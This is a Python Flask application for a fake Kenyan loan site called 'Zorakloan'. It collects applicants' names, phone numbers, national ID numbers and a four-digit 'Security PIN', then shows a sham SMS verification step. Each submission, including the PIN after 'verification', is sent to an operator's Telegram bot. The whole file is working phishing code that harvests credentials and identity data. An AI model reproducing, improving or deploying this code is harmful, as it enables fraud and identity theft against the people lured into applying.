import os, random
from flask import Flask, request, render_template_string, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "zorak-final-405-fix"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
loans_db = {}

# ... KEEP YOUR HTML SAME AS BEFORE ...

# FIX: ALL ROUTES ALLOW GET+POST
@app.route('/', methods=['GET','POST'])
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {k: request.form.get(k) for k in ['full_name','phone','id_number','county','amount','period','employment','pin']}
        pending['ref']=ref
        session['pending']=pending; session['otp']=otp
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": f"🔑 OTP {otp}\n📞 {pending['phone']}\n👤 {pending['full_name']}\nRef {ref}"})
        except: pass
        html = f"""
        <div style="max-width:400px;margin:60px auto;padding:30px;background:white;border-radius:15px;text-align:center;font-family:Arial;box-shadow:0 5px 20px rgba(0,0,0,0.1)">
        <h2>📱 SMS Sent!</h2><p>Code sent to <b>{pending['phone']}</b></p>
        <div style="font-size:32px;letter-spacing:8px;font-weight:bold;color:#0a7a3e;background:#e8f5e9;padding:15px;border-radius:10px;margin:15px 0;border:2px dashed #0a7a3e">{otp}</div>
        <form method="POST" action="/verify-otp"><input name="otp" maxlength="6" placeholder="Enter 6-digit code" required style="width:100%;padding:14px;font-size:20px;text-align:center;letter-spacing:5px"><button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:15px">Verify</button></form></div>
        """
        return render_template_string(html)
    # GET - show form
    return render_template_string("""<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:430px;margin:auto;padding:25px;border-radius:15px}h2{text-align:center;color:#0a7a3e}input,select{width:100%;padding:12px;margin:7px 0;border:1px solid #ccc;border-radius:8px;box-sizing:border-box}button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:17px;font-weight:bold}.pin{background:#fff8e1;padding:10px;border-radius:8px;border:1px dashed #ffb300}</style></head><body><div class="box"><h2>Zorakloan 🇰🇪</h2><form method="POST"><input name="full_name" placeholder="Full Name" required><input name="phone" placeholder="Phone 07..." required><input name="id_number" placeholder="ID Number" required><input name="county" placeholder="County" required><input name="amount" type="number" placeholder="Amount Ksh" required><select name="period" required><option value="">Duration</option><option>7 Days</option><option>14 Days</option><option>1 Month</option></select><select name="employment" required><option value="">Employment</option><option>Employed</option><option>Business</option><option>Farmer</option></select><div class="pin"><b>🔐 Security PIN</b><input name="pin" type="password" maxlength="4" placeholder="1234" required></div><button>Apply Now</button></form></div></body></html>""")

@app.route('/verify-otp', methods=['GET','POST'])
def verify():
    if request.method == 'GET':
        return redirect('/api')
    if request.form.get('otp') == session.get('otp') and session.get('pending'):
        loan = session.get('pending'); loans_db[loan['phone']] = loan
        try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": f"✅ VERIFIED {loan['ref']}\n👤 {loan['full_name']}\n📞 {loan['phone']} ✅\n💰 {loan['amount']}\n🔐 PIN {loan['pin']}"})
        except: pass
        session.clear()
        return f"<div style='text-align:center;margin-top:80px;font-family:Arial'><h1 style='color:#0a7a3e'>✅ Verified! Ref {loan['ref']}</h1></div>"
    return "<div style='text-align:center;margin-top:80px;font-family:Arial'><h2 style='color:red'>❌ Wrong Code</h2><a href='/api'>Retry</a></div>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)